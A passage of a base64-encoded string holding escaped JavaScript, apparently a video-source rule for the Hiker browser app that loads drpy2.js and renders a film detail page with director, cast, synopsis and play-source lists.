sZW5ndGggPiAxKSB7XFxcXG4gICAgICAgICAgICAgICAgLy8g5aaC5p6c5Y+C5pWw5pWw6YeP5aSn5LqOMe+8jOiwg+eUqOWOn+Wni+eahGNvbnNvbGUubG9n5Ye95pWwXFxcXG4gICAgICAgICAgICAgICAgLy9vcmlnaW5hbExvZy5hcHBseShjb25zb2xlLCBhcmd1bWVudHMpO1xcXFxuICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm47XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAvLyDlpoLmnpzlj4LmlbDlj6rmnInkuIDkuKrvvIzliJnkuI3lgZrku7vkvZXmk43kvZxcXFxcbiAgICAgICAgfTtcXFxcbiAgICB9XFxcXG59XFxcXG5pbml0SGlrZXIoKTtcXFxcbmNvbnN0IGRycHlQYXRoID0gZ2V0UGF0aChcXFxcXFxcImhpa2VyOi8vZmlsZXMvZGF0YS9cXFxcXFxcIiArIE1ZX1JVTEUudGl0bGUgKyBcXFxcXFxcIi9saWJzX2hpa2VyL2RycHkyLmpzXFxcXFxcXCIpO1xcXFxuXFxcXG5pZiAoIWZpbGVFeGlzdChkcnB5UGF0aCkpIHtcXFxcbiAgICB0aHJvdyBuZXcgRXJyb3IoXFxcXFxcXCLnvLrlsJFkcnB5Lmpz6L+Q6KGM5bqTXFxcXFxcXCIpO1xcXFxufVxcXFxubGV0IGRycHkgPSAkLnJlcXVpcmUoZHJweVBhdGgpO1xcXFxuLypcXFxcbmxldCBjdXJyZW50UGF0aCA9IFxcXFxcXFwiXFxcXFxcXCI7XFxcXG5sZXQgJGluaXQgPSBkcnB5LmluaXQ7XFxcXG5kcnB5LmluaXQgPSBmdW5jdGlvbihleHQpIHtcXFxcbiAgICBpZiAoZXh0ID09PSBjdXJyZW50UGF0aCkgcmV0dXJuO1xcXFxuICAgICRpbml0LmNhbGwodGhpcywgZXh0KTtcXFxcbiAgICBjdXJyZW50UGF0aCA9IGV4dDtcXFxcbn0qL1xcXFxuJC5leHBvcnRzID0gZHJweTtcXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfMV92ZXJ0aWNhbF9waWNfYmx1clxcXCIsXFxcIm5hbWVcXFwiOlxcXCLor6bnu4bpobXpnaJcXFwiLFxcXCJwYXRoXFxcIjpcXFwiZGV0YWlsZWRcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG4oZnVuY3Rpb24gKCkge1xcXFxuICBsZXQgaWQgPSBNWV9QQVJBTVMudm9kSWQ7XFxcXG4gIGFkZExpc3RlbmVyKFxcXFxcXFwib25DbG9zZVxcXFxcXFwiLCAoKSA9PiB7XFxcXG4gICAgR00uY2xlYXIoXFxcXFxcXCJyZW5vdmF0ZUxpc3RcXFxcXFxcIik7XFxcXG4gICAgY2xlYXJNeVZhcihcXFxcXFxcInNvcnRpXFxcXFxcXCIpO1xcXFxuICAgIGNsZWFyTXlWYXIoXFxcXFxcXCJwYWdlbnVtXFxcXFxcXCIpO1xcXFxuICB9KTtcXFxcbiAgYWRkTGlzdGVuZXIoJ29uUmVmcmVzaCcsICQudG9TdHJpbmcoKGlkKSA9PiB7XFxcXG4gICAgLy9jbGVhck15VmFyKGlkICsgXFxcXFxcXCJlcmluZm9cXFxcXFxcIilcXFxcbiAgfSwgaWQpKVxcXFxuXFxcXG4gIC8v5pa55rOVXFxcXG4gIGZ1bmN0aW9uIGZvbnRzdHlsZSh0ZXh0LCBwYXJhbXMpIHtcXFxcbiAgICBwYXJhbXMgPSBwYXJhbXMgfHwgdW5kZWZpbmVkO1xcXFxuICAgIHZhciBoID0gcGFyYW1zLmggIT09IGZhbHNlID8gJ+KAnOKAnOKAneKAnScgOiAnJztcXFxcbiAgICB2YXIgdGFncyA9IHBhcmFtcy50YWdzIHx8IFxcXFxcXFwiXFxcXFxcXCI7XFxcXG4gICAgaWYgKHBhcmFtcy5jICE9IHVuZGVmaW5lZCkge1xcXFxuICAgICAgdGV4dCA9IHRleHQuZm9udGNvbG9yKHBhcmFtcy5jKTtcXFxcbiAgICB9XFxcXG4gICAgaWYgKHRhZ3MpIHtcXFxcbiAgICAgIHZhciB0YWdBcnJheSA9IHRhZ3Muc3BsaXQoJ3wnKS5maWx0ZXIoZSA9PiBlKTtcXFxcbiAgICAgIHZhciBvcGVuVGFncyA9ICcnO1xcXFxuICAgICAgdmFyIGNsb3NlVGFncyA9ICcnO1xcXFxuICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCB0YWdBcnJheS5sZW5ndGg7IGkrKykge1xcXFxuICAgICAgICBvcGVuVGFncyArPSAnPCcgKyB0YWdBcnJheVtpXSArICc+JztcXFxcbiAgICAgICAgY2xvc2VUYWdzID0gJzwvJyArIHRhZ0FycmF5W2ldICsgJz4nICsgY2xvc2VUYWdzO1xcXFxuICAgICAgfVxcXFxuICAgICAgdGV4dCA9IG9wZW5UYWdzICsgdGV4dCArIGNsb3NlVGFncztcXFxcbiAgICB9XFxcXG4gICAgcmV0dXJuIGggKyB0ZXh0O1xcXFxuICB9XFxcXG5cXFxcbiAgZnVuY3Rpb24gZmluZExvbmdlc3RFbGVtZW50KGFycikge1xcXFxuICAgIHJldHVybiBhcnIucmVkdWNlKChhLCBiKSA9PiBhLmxlbmd0aCA+IGIubGVuZ3RoID8gYSA6IGIpO1xcXFxuICB9XFxcXG5cXFxcbiAgZnVuY3Rpb24gY291bnRUb3RhbEJ5dGVzKHRleHQpIHtcXFxcbiAgICB2YXIgY291bnQgPSAwO1xcXFxuICAgIGZvciAodmFyIGkgPSAwOyBpIDwgdGV4dC5sZW5ndGg7IGkrKykge1xcXFxuICAgICAgdmFyIGNvZGUgPSB0ZXh0LmNoYXJDb2RlQXQoaSk7XFxcXG4gICAgICBpZiAoY29kZSA+PSAweDAxMDApIHsgLy8g5Y+M5a2X6IqC5a2X56ym55qEIFVuaWNvZGUg57yW56CB5aSn5LqOIDI1NVxcXFxuICAgICAgICBjb3VudCArPSAyOyAvLyDlj4zlrZfoioLlrZfnrKborqHmlbDkuLoyXFxcXG4gICAgICB9IGVsc2Uge1xcXFxuICAgICAgICBjb3VudCArPSAxOyAvLyDljZXlrZfoioLlrZfnrKborqHmlbDkuLoxXFxcXG4gICAgICB9XFxcXG4gICAgfVxcXFxuICAgIHJldHVybiBjb3VudDtcXFxcbiAgfVxcXFxuXFxcXG4gIGZ1bmN0aW9uIHN1YnN0cihzdHIsIG1heExlbmd0aCkge1xcXFxuICAgIGxldCBsZW4gPSAwO1xcXFxuICAgIGZvciAobGV0IGkgPSAwOyBpIDwgc3RyLmxlbmd0aDsgaSsrKSB7XFxcXG4gICAgICBpZiAoc3RyLmNoYXJDb2RlQXQoaSkgPiAyNTUpIHtcXFxcbiAgICAgICAgbGVuICs9IDI7XFxcXG4gICAgICB9IGVsc2Uge1xcXFxuICAgICAgICBsZW4rKztcXFxcbiAgICAgIH1cXFxcbiAgICAgIGlmIChsZW4gPiBtYXhMZW5ndGgpIHtcXFxcbiAgICAgICAgcmV0dXJuIHN0ci5zbGljZSgwLCBpKSArICcuLi4nO1xcXFxuICAgICAgfVxcXFxuICAgIH1cXFxcbiAgICByZXR1cm4gc3RyO1xcXFxuICB9XFxcXG5cXFxcbiAgZnVuY3Rpb24gc2V0RGVzYyhkZXNjLCBudW0pIHtcXFxcbiAgICBpZiAoZGVzYyA9PSB1bmRlZmluZWQpIHtcXFxcbiAgICAgIHJldHVybjtcXFxcbiAgICB9XFxcXG4gICAgZGVzYyA9IGRlc2MuY29uc3RydWN0b3IgPT0gQXJyYXkgPyBkZXNjLmpvaW4oJzxicj4nKSA6IGRlc2M7XFxcXG4gICAgaWYgKGRlc2MucmVwbGFjZSgvKDxicj58XFxcXFxcXFxzKykvZywgJycpLmxlbmd0aCA9PSAwKSB7XFxcXG4gICAgICBkLnB1c2goe1xcXFxuICAgICAgICBjb2xfdHlwZTogJ2JpZ19ibGFua19ibG9jaydcXFxcbiAgICAgIH0pXFxcXG4gICAgICBkLnB1c2goe1xcXFxuICAgICAgICBjb2xfdHlwZTogJ2JpZ19ibGFua19ibG9jaydcXFxcbiAgICAgIH0pXFxcXG4gICAgICByZXR1cm47XFxcXG4gICAgfVxcXFxuXFxcXG4gICAgY29uc3QgbWFyayA9ICdkZXNjJztcXFxcbiAgICBudW0gPSB0eXBlb2YgKG51bSkgPT0gJ3VuZGVmaW5lZCcgPyAxMDAgOiBudW1cXFxcbiAgICBkZXNjID0gZGVzYy5zdGFydHNXaXRoKCfjgIDjgIAnKSA/IGRlc2MgOiAn44CA44CAJyArIGRlc2M7XFxcXG4gICAgZGVzYyA9IGRlc2MucmVwbGFjZSgvJy9nLCBcXFxcXFxcIiYjMzk7XFxcXFxcXCIpO1xcXFxuICAgIGRlc2MgPSBkZXNjLnJlcGxhY2UoL1xcXFxcXFxcclxcXFxcXFxcbi9nLCBcXFxcXFxcIjxicj5cXFxcXFxcIik7XFxcXG4gICAgZGVzYyA9IGRlc2MucmVwbGFjZSgvXFxcXFxcXFxuL2csIFxcXFxcXFwiPGJyPlxcXFxcXFwiKTtcXFxcbiAgICBsZXQgc2Rlc2MgPSBzdWJzdHIoZGVzYywgbnVtKTtcXFxcblxcXFxuICAgIHZhciBjb2xvcnMgPSB7XFxcXG4gICAgICBzaG93OiBcXFxcXFxcImJsYWNrXFxcXFxcXCIsXFxcXG4gICAgICBoaWRlOiBcXFxcXFxcImdyZXlcXFxcXFxcIlxcXFxuICAgIH1cXFxcblxcXFxuICAgIHZhciBsYXp5ID0gJChgI25vTG9hZGluZyNgKS5sYXp5UnVsZSgoZGMsIHNkYywgbSwgY3MpID0+IHtcXFxcbiAgICAgIHZhciBzaG93ID0gc3RvcmFnZTAuZ2V0SXRlbShtLCAnMCcpO1xcXFxuICAgICAgdmFyIHRpdGxlID0gZmluZEl0ZW0oJ2Rlc2MnKS50aXRsZTtcXFxcbiAgICAgIHZhciByZSA9IC8oPFxcXFxcXFxcL3NtYWxsPjxicj4uKj8+KS4rL2c7XFxcXG4gICAgICB2YXIgZXhwID0gJ+WxleW8gDonO1xcXFxuICAgICAgdmFyIHJldCA9ICfmlLbotbc6JztcXFxcbiAgICAgIGlmIChzaG93ID09ICcxJykge1xcXFxuICAgICAgICB1cGRhdGVJdGVtKCdkZXNjJywge1xcXFxuICAgICAgICAgIHRpdGxlOiB0aXRsZVxcXFxuICAgICAgICAgICAgLnJlcGxhY2UocmV0LCBleHApXFxcXG4gICAgICAgICAgICAucmVwbGFjZShyZSwgJyQxJyArIHNkYyArICc8L3NtYWxsPicpXFxcXG4gICAgICAgICAgICAucmVwbGFjZSgvKDxcXFxcXFxcXC9zbWFsbD48YnI+XFxcXFxcXFw8Zm9udCBjb2xvcj1cXFxcXFxcIikuKj8oXFxcXFxcXCI+KS8sICckMScgKyBjcy5oaWRlICsgJyQyJylcXFxcblxcXFxuICAgICAgICB9KVxcXFxuICAgICAgICBzdG9yYWdlMC5zZXRJdGVtKG0sICcwJyk7XFxcXG4gICAgICB9IGVsc2Uge1xcXFxuICAgICAgICB1cGRhdGVJdGVtKCdkZXNjJywge1xcXFxuICAgICAgICAgIHRpdGxlOiB0aXRsZVxcXFxuICAgICAgICAgICAgLnJlcGxhY2UoZXhwLCByZXQpXFxcXG4gICAgICAgICAgICAucmVwbGFjZShyZSwgJyQxJyArIGRjICsgJzwvc21hbGw+JylcXFxcbiAgICAgICAgICAgIC5yZXBsYWNlKC8oPFxcXFxcXFxcL3NtYWxsPjxicj5cXFxcXFxcXDxmb250IGNvbG9yPVxcXFxcXFwiKS4qPyhcXFxcXFxcIj4pLywgJyQxJyArIGNzLnNob3cgKyAnJDInKVxcXFxuICAgICAgICB9KVxcXFxuICAgICAgICBzdG9yYWdlMC5zZXRJdGVtKG0sICcxJyk7XFxcXG4gICAgICB9XFxcXG4gICAgICByZXR1cm4gYGhpa2VyOi8vZW1wdHlgXFxcXG4gICAgfSwgZGVzYywgc2Rlc2MsIG1hcmssIGNvbG9ycylcXFxcbiAgICB2YXIgc2MgPSBzdG9yYWdlMC5nZXRJdGVtKG1hcmssICcwJykgPT0gJzAnID8gJ+WxleW8gDonIDogJ+aUtui1tzonO1xcXFxuICAgIHZhciBkYyA9IHN0b3JhZ2UwLmdldEl0ZW0obWFyaywgJzAnKSA9PSAnMCcgPyBzZGVzYyA6IGRlc2M7XFxcXG4gICAgdmFyIGNzID0gc3RvcmFnZTAuZ2V0SXRlbShtYXJrLCAnMCcpID09ICcwJyA/IGNvbG9ycy5oaWRlIDogY29sb3JzLnNob3c7XFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgIHRpdGxlOiAnJyArICc8Yj48Zm9udCBjb2xvcj1cXFxcXFxcIiMwOThBQzFcXFxcXFxcIj7iiLfliafmg4XnroDku4tcXFxcdDwvZm9udD48L2I+JyArIFxcXFxcXFwiPHNtYWxsPjxhIHN0eWxlPSd0ZXh0LWRlY29yYXRpb246IG5vbmU7JyBocmVmPSdcXFxcXFxcIiArIGxhenkgKyBcXFxcXFxcIic+XFxcXFxcXCIgKyBzYyArICc8L2E+PC9zbWFsbD48YnI+PGZvbnQgY29sb3I9XFxcXFxcXCInICsgY3MgKyAnXFxcXFxcXCI+JyArIGAke2RjfWAgKyAnPC9zbWFsbD4nLFxcXFxuICAgICAgY29sX3R5cGU6ICdyaWNoX3RleHQnLFxcXFxuICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgaWQ6ICdkZXNjJyxcXFxcbiAgICAgICAgbGluZVNwYWNpbmc6IDYsXFxcXG4gICAgICAgIHRleHRTaXplOiAxNSxcXFxcbiAgICAgICAgbGluZVZpc2libGU6IHRydWUsXFxcXG4gICAgICB9XFxcXG4gICAgfSlcXFxcbiAgfVxcXFxuXFxcXG4gIE9iamVjdC5kZWZpbmVQcm9wZXJ0eShTdHJpbmcucHJvdG90eXBlLCAnU3BsaXQnLCB7XFxcXG4gICAgdmFsdWU6IGZ1bmN0aW9uIChzLCBlKSB7XFxcXG4gICAgICBpZiAoZSkge1xcXFxuICAgICAgICByZXR1cm4gdGhpcy5zcGxpdChzKS5maWx0ZXIoaXRlbSA9PiBpdGVtICE9PSAnJyk7XFxcXG4gICAgICB9IGVsc2Uge1xcXFxuICAgICAgICByZXR1cm4gdGhpcy5zcGxpdChzKTtcXFxcbiAgICAgIH1cXFxcbiAgICB9LFxcXFxuICAgIGVudW1lcmFibGU6IGZhbHNlLFxcXFxuICB9KTtcXFxcblxcXFxuXFxcXG4gIGxldCBzb3J0b2JqID0gW1xcXFxuICAgIGZvbnRzdHlsZShcXFxcXFxcIuato+W6j1xcXFxcXFwiLCB7XFxcXG4gICAgICBjOiBcXFxcXFxcIiMxQUFEMTlcXFxcXFxcIixcXFxcbiAgICAgIHRhZ3M6IFxcXFxcXFwiYlxcXFxcXFwiXFxcXG4gICAgfSksXFxcXG4gICAgZm9udHN0eWxlKFxcXFxcXFwi6YCG5bqPXFxcXFxcXCIsIHtcXFxcbiAgICAgIGM6IFxcXFxcXFwiI0ZGMDAwMFxcXFxcXFwiLFxcXFxuICAgICAgdGFnczogXFxcXFxcXCJiXFxcXFxcXCJcXFxcbiAgICB9KVxcXFxuICBdXFxcXG4gIC8v5pa55rOVXFxcXG5cXFxcbiAgdmFyIHNvcnRpID0gZ2V0TXlWYXIoXFxcXFxcXCJzb3J0aVxcXFxcXFwiLCBcXFxcXFxcIjBcXFxcXFxcIik7XFxcXG5cXFxcbiAgLy9sb2coc29ydG9iailcXFxcbiAgJC5leHRlbmQoe1xcXFxuICAgIHNwbGl0UGFnZSh0b3RhbEl0ZW1zLCBwYWdlU2l6ZSkge1xcXFxuICAgICAgcGFnZVNpemUgPSBwYWdlU2l6ZSB8fCA1MDtcXFxcbiAgICAgIGxldCByZXN1bHQgPSBbXTtcXFxcbiAgICAgIGZvciAobGV0IGkgPSAxOyBpIDw9IHRvdGFsSXRlbXM7IGkgKz0gcGFnZVNpemUpIHtcXFxcbiAgICAgICAgbGV0IGVuZCA9IGkgKyBwYWdlU2l6ZSAtIDE7XFxcXG4gICAgICAgIGlmIChlbmQgPiB0b3RhbEl0ZW1zKSB7XFxcXG4gICAgICAgICAgZW5kID0gdG90YWxJdGVtcztcXFxcbiAgICAgICAgfVxcXFxuICAgICAgICByZXN1bHQucHVzaChgJHtpfS0ke2VuZH1gKTtcXFxcbiAgICAgIH1cXFxcbiAgICAgIHJldHVybiByZXN1bHQ7XFxcXG4gICAgfSxcXFxcbiAgICBzcGxpdEFycmF5QnlSYW5nZXMoYXJyYXksIHJhbmdlcykge1xcXFxuICAgICAgLy8g5qC55o2u6IyD5Zu05ouG5YiG5pWw57uEXFxcXG4gICAgICB2YXIgcmVzdWx0ID0gcmFuZ2VzLm1hcChmdW5jdGlvbiAocmFuZ2UpIHtcXFxcbiAgICAgICAgdmFyIHBhcnRzID0gcmFuZ2Uuc3BsaXQoJy0nKS5tYXAoTnVtYmVyKTtcXFxcbiAgICAgICAgdmFyIHN0YXJ0ID0gcGFydHNbMF0gLSAxOyAvLyDlh48x5piv5Zug5Li65pWw57uE57Si5byV5LuOMOW8gOWni1xcXFxuICAgICAgICB2YXIgZW5kID0gcGFydHNbMV0gLSAxO1xcXFxuICAgICAgICAvLyDkvb/nlKhBcnJheS5wcm90b3R5cGUuc2xpY2XmnaXojrflj5blrZDmlbDnu4RcXFxcbiAgICAgICAgcmV0dXJuIGFycmF5LnNsaWNlKHN0YXJ0LCBlbmQgKyAxKTsgLy8g5YyF5ous57uT5p2f57Si5byV77yM5omA5Lul5YqgMVxcXFxuICAgICAgfSk7XFxcXG4gICAgICByZXR1cm4gcmVzdWx0O1xcXFxuICAgIH0sXFxcXG4gIH0pXFxcXG5cXFxcbiAgbGV0IHNvdXJjZSA9IHt9O1xcXFxuICBpZihNWV9QQVJBTVMuc291cmNlKXtcXFxcbiAgICAgIHNvdXJjZT1NWV9QQVJBTVMuc291cmNlO1xcXFxuICB9ZWxzZXtcXFxcbiAgICAgIGNvbnN0IHJ1bnRpbWVDb25maWcgPSBHTS5kZWZpbmVNb2R1bGUoXFxcXFxcXCJydW50aW1lQ29uZmlnXFxcXFxcXCIpO1xcXFxuICAgICAgc291cmNlPXJ1bnRpbWVDb25maWcuZmluZFNvdXJjZShNWV9QQVJBTVMuc2tleSk7XFxcXG4gICAgICBNWV9QQVJBTVMuc291cmNlPXNvdXJjZTtcXFxcbiAgICAgIHNldFBhZ2VQYXJhbXMoTVlfUEFSQU1TKTtcXFxcbiAgfVxcXFxuICBcXFxcbiAgY29uc3QgRHJweU1hbmFnZSA9IEdNLmRlZmluZU1vZHVsZShcXFxcXFxcIkRycHlNYW5hZ2VcXFxcXFxcIik7XFxcXG4gIFxcXFxuICBEcnB5TWFuYWdlLmluaXRQYWdlKFxcXFxcXFwiZXJcXFxcXFxcIik7XFxcXG4gIGxvZyhzb3VyY2UpO1xcXFxuICBsZXQgZHJweSA9IERycHlNYW5hZ2UuZ2V0QnlTb3VyY2Uoc291cmNlKTtcXFxcblxcXFxuICBsZXQgaW5mbyA9IHN0b3JhZ2UwLmdldE15VmFyKGlkICsgXFxcXFxcXCJlcmluZm9cXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG5cXFxcbiAgaWYgKGluZm8gPT0gXFxcXFxcXCJcXFxcXFxcIikge1xcXFxuICAgIGluZm8gPSBKU09OLnBhcnNlKGRycHkuZGV0YWlsKFN0cmluZyhpZCkpKS5saXN0WzBdO1xcXFxuICAgIHN0b3JhZ2UwLnB1dE15VmFyKGlkICsgXFxcXFxcXCJlcmluZm9cXFxcXFxcIiwgaW5mbylcXFxcbiAgfVxcXFxuXFxcXG4gIGxldCBb5a+85ryULCDkuLvmvJRdID0gW2luZm8udm9kX2RpcmVjdG9yLCBpbmZvLnZvZF9hY3Rvcl1cXFxcbiAgaWYgKOWvvOa8lCAhPSB1bmRlZmluZWQpIHtcXFxcbiAgICDlr7zmvJQgPSDlr7zmvJQuU3BsaXQoL1xcXFxcXFxcLy9nLCB0cnVlKS5qb2luKFxcXFxcXFwiIFxcXFxcXFwiKTtcXFxcbiAgICDlr7zmvJQgPSAvWzrvvJpdLy50ZXN0KOWvvOa8lCkgPyDlr7zmvJQgOiBcXFxcXFxcIuWvvOa8lDpcXFxcXFxcIiArIOWvvOa8lFxcXFxuICB9XFxcXG4gIGlmICjkuLvmvJQgIT0gdW5kZWZpbmVkKSB7XFxcXG4gICAg5Li75ryUID0g5Li75ryULlNwbGl0KC9cXFxcXFxcXC8vZywgdHJ1ZSkuam9pbihcXFxcXFxcIiBcXFxcXFxcIik7XFxcXG4gICAg5Li75ryUID0gL1s677yaXS8udGVzdCjkuLvmvJQpID8g5Li75ryUIDogXFxcXFxcXCLkuLvmvJQ6XFxcXFxcXCIgKyDkuLvmvJRcXFxcbiAgfVxcXFxuICBsZXQgW+WQjeensCwg5aSH5rOoXSA9IFtpbmZvLnZvZF9uYW1lLCBpbmZvLnZvZF9yZW1hcmtzXVxcXFxuICBpZiAo5aSH5rOoICE9IHVuZGVmaW5lZCkge1xcXFxuICAgIOWkh+azqCA9IOWkh+azqC5TcGxpdCgvXFxcXFxcXFwvL2csIHRydWUpLmpvaW4oXFxcXFxcXCIgXFxcXFxcXCIpO1xcXFxuICAgIOWkh+azqCA9IC9bOu+8ml0vLnRlc3Qo5aSH5rOoKSA/IOWkh+azqCA6IFxcXFxcXFwi5aSH5rOoOlxcXFxcXFwiICsg5aSH5rOoO1xcXFxuICB9XFxcXG4gIGxldCB0aXRsZXMgPSBb5ZCN56ewLCDlpIfms6hdO1xcXFxuICBsZXQgZGVzY3MgPSBb5a+85ryULCDkuLvmvJRdXFxcXG5cXFxcbiAgbGV0IGQgPSBbXTtcXFxcbiAgZC5wdXNoKHtcXFxcbiAgICB0aXRsZTogdGl0bGVzLmZpbHRlcihlID0+IGUpLmpvaW4oXFxcXFxcXCJcXFxcXFxcXG5cXFxcXFxcIiksXFxcXG4gICAgZGVzYzogZGVzY3MuZmlsdGVyKGUgPT4gZSkuam9pbihcXFxcXFxcIlxcXFxcXFxcblxcXFxcXFwiKSxcXFxcbiAgICBwaWNfdXJsOiBpbmZvLnZvZF9waWMgfHwgTVlfUEFSQU1TLmltZyxcXFxcbiAgICBleHRyYToge1xcXFxuICAgICAgZ3JhZGllbnQ6IGZhbHNlLFxcXFxuICAgIH1cXFxcbiAgfSk7XFxcXG4gIGQucHVzaCh7XFxcXG4gICAgdGl0bGU6ICfmlbDmja7mnaXmupA6JyArIE1ZX1BBUkFNUy5zbmFtZSxcXFxcbiAgICAvL2Rlc2M6XFxcXFxcXCJcXFxcXFxcIitNWV9QQVJBTVMuc2tleStcXFxcXFxcIlxcXFxcXFxcdFxcXFxcXFwiLFxcXFxuICAgIGltZzogXFxcXFxcXCJodHRwczovL2hpa2VyZmFucy5jb20vdHViaWFvL21lc3N5Lzc4LnN2Z1xcXFxcXFwiLFxcXFxuICAgIHVybDogXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCIsXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwiYXZhdGFyXFxcXFxcXCJcXFxcbiAgfSlcXFxcbiAgc2V0RGVzYyhpbmZvLnZvZF9jb250ZW50KVxcXFxuXFxcXG4gIC8qXFxcXG4gIGZ1bmN0aW9uIHBhcnNlUXVlcnkocXVlcnkpIHtcXFxcbiAgICB2YXIgb2JqID0ge307XFxcXG4gICAgcXVlcnkuc3BsaXQoXFxcXFxcXCImXFxcXFxcXCIpLmZpbHRlcihlID0+IGUpLmZvckVhY2goZnVuY3Rpb24gKGl0ZW0pIHtcXFxcbiAgICAgIHZhciBwYXJ0cyA9IGl0ZW0uc3BsaXQoXFxcXFxcXCI9XFxcXFxcXCIpO1xcXFxuICAgICAgb2JqW3BhcnRzWzBdXSA9IHBhcnRzWzFdO1xcXFxuICAgIH0pO1xcXFxuICAgIHJldHVybiBvYmo7XFxcXG4gIH1cXFxcblxcXFxuICAvL2pz5omn6KGMXFxcXG4gIGxldCBwYXJzZV9vYmogPSB7XFxcXG4gICAgZGVmUnVsZXM6IFtcXFxcXFxcIioubXA0XFxcXFxcXCIsIFxcXFxcXFwiKi5tM3U4XFxcXFxcXCJdLFxcXFxuICB9O1xcXFxuICB2YXIgZXh0cmEgPSB7XFxcXG4gICAgXFxcXFxcXCJ1YVxcXFxcXFwiOiBNT0JJTEVfVUFcXFxcbiAgfVxcXFxuICBsZXQgcGFyc2UgPSBKU09OLnBhcnNlKGRycHkucGxheSgpKTtcXFxcbiAgLy9jb25zb2xlLmxvZyhwYXJzZSk7XFxcXG4gIGlmIChwYXJzZS5oYXNPd25Qcm9wZXJ0eShcXFxcXFxcInBhcnNlX2V4dHJhXFxcXFxcXCIpKSB7XFxcXG4gICAgbGV0IHBhcnNlX2V4dHJhID0gZGVjb2RlVVJJQ29tcG9uZW50KHBhcnNlLnBhcnNlX2V4dHJhKTtcXFxcbiAgICBwYXJzZV9vYmogPSBPYmplY3QuYXNzaWduKHBhcnNlX29iaiwgcGFyc2VRdWVyeShwYXJzZV9leHRyYSkpO1xcXFxuICAgIGlmIChwYXJzZV9vYmouaGFzT3duUHJvcGVydHkoXFxcXFxcXCJpbml0X3NjcmlwdFxcXFxcXFwiKSkge1xcXFxuICAgICAgcGFyc2Vfb2JqW1xcXFxcXFwiaW5pdF9zY3JpcHRcXFxcXFxcIl0gPSBiYXNlNjREZWNvZGUocGFyc2Vfb2JqW1xcXFxcXFwiaW5pdF9zY3JpcHRcXFxcXFxcIl0pO1xcXFxuICAgIH1cXFxcbiAgfVxcXFxuICBpZiAocGFyc2Vfb2JqLmhhc093blByb3BlcnR5KFxcXFxcXFwiaXNfcGNcXFxcXFxcIikgJiYgcGFyc2Vfb2JqW1xcXFxcXFwiaXNfcGNcXFxcXFxcIl0gPT0gXFxcXFxcXCIxXFxcXFxcXCIpIHtcXFxcbiAgICBleHRyYVtcXFxcXFxcInVhXFxcXFxcXCJdID0gUENfVUE7XFxcXG4gIH1cXFxcbiAgaWYgKHBhcnNlLmhhc093blByb3BlcnR5KFxcXFxcXFwiaGVhZGVyXFxcXFxcXCIpKSB7XFxcXG4gICAgZXh0cmFbXFxcXFxcXCJ1YVxcXFxcXFwiXSA9IHBhcnNlW1xcXFxcXFwiaGVhZGVyXFxcXFxcXCJdW1xcXFxcXFwiVXNlci1BZ2VudFxcXFxcXFwiXTtcXFxcbiAgICAvL2V4dHJhW1xcXFxcXFwicmVkaXJlY3RcXFxcXFxcIl09ZmFsc2U7XFxcXG4gICAgZXh0cmFbXFxcXFxcXCJqc1xcXFxcXFwiXSA9ICQudG9TdHJpbmcoKGpzKSA9PiB7XFxcXG4gICAgICBldmFsKGpzKVxcXFxuICAgICAgZmJhLmxvZyhuYXZpZ2F0b3IudXNlckFnZW50KVxcXFxuICAgICAgZmJhLmxvZyhsb2NhdGlvbi5ocmVmKVxcXFxuICAgIH0sICQudG9TdHJpbmcoKCkgPT4ge1xcXFxuICAgICAgT2JqZWN0LmRlZmluZVByb3BlcnR5KG5hdmlnYXRvciwgJ3VzZXJBZ2VudCcsIHtcXFxcbiAgICAgICAgZ2V0OiBmdW5jdGlvbiAoKSB7XFxcXG4gICAgICAgICAgcmV0dXJuICdNeS1DdXN0b20tVUEtU3RyaW5nJztcXFxcbiAgICAgICAgfVxcXFxuICAgICAgfSk7XFxcXG4gICAgfSkpXFxcXG4gIH1cXFxcbiAgaWYgKHBhcnNlX29iai5oYXNPd25Qcm9wZXJ0eShcXFxcXFxcImN1c3RvbV9yZWdleFxcXFxcXFwiKSkge1xcXFxuICAgIGxldCBjdXJyZW50ID0gcGFyc2Vfb2JqW1xcXFxcXFwiZGVmUnVsZXNcXFxcXFxcIl07XFxcXG4gICAgZXh0cmFbXFxcXFxcXCJ2aWRlb1J1bGVzXFxcXFxcXCJdID0gY3VycmVudC5jb25jYXQocGFyc2Vfb2JqLmN1c3RvbV9yZWdleC5zcGxpdCgvXFxcXFxcXFx8L2cpLmZpbHRlcihlID0+IGUpKVxcXFxuICB9XFxcXG4gIGlmIChwYXJzZS5oYXNPd25Qcm9wZXJ0eShcXFxcXFxcImpzXFxcXFxcXCIpKSB7XFxcXG4gICAgZXh0cmFbXFxcXFxcXCJqc1xcXFxcXFwiXSA9ICQudG9TdHJpbmcoKGpzLCBwYXJzZSwgdCkgPT4ge1xcXFxuICAgICAgaWYgKHBhcnNlLmhhc093blByb3BlcnR5KFxcXFxcXFwiaW5pdF9zY3JpcHRcXFxcXFxcIikpIHtcXFxcbiAgICAgICAgZmJhLmxvZyh0ICsgXFxcXFxcXCI65omn6KGMaW5pdF9zY3JpcHRcXFxcXFxcIik7XFxcXG4gICAgICAgIGV2YWwocGFyc2UuaW5pdF9zY3JpcHQpO1xcXFxuICAgICAgfVxcXFxuICAgICAgZmJhLmxvZyhuYXZpZ2F0b3IucGxhdGZvcm0pO1xcXFxuICAgICAgZmJhLmxvZyh0ICsgXFxcXFxcXCI65omn6KGManPngrnlh7tcXFxcXFxcIilcXFxcbiAgICAgIGV2YWwoanMpXFxcXG4gICAgfSwgcGFyc2UuanMsIHBhcnNlX29iaiwgTVlfUlVMRS50aXRsZSlcXFxcbiAgfVxcXFxuICAvL2xvZyhleHRyYSlcXFxcbiAgKi9cXFxcbiAgbGV0IGZyb20gPSBbXTtcXFxcbiAgaWYgKGluZm8udm9kX3BsYXlfZnJvbSAhPSB1bmRlZmluZWQpIHtcXFxcbiAgICBmcm9tID0gaW5mby52b2RfcGxheV9mcm9tLnNwbGl0KFxcXFxcXFwiJCQkXFxcXFxcXCIpO1xcXFxuICAgIC8qbGV0IHBsYX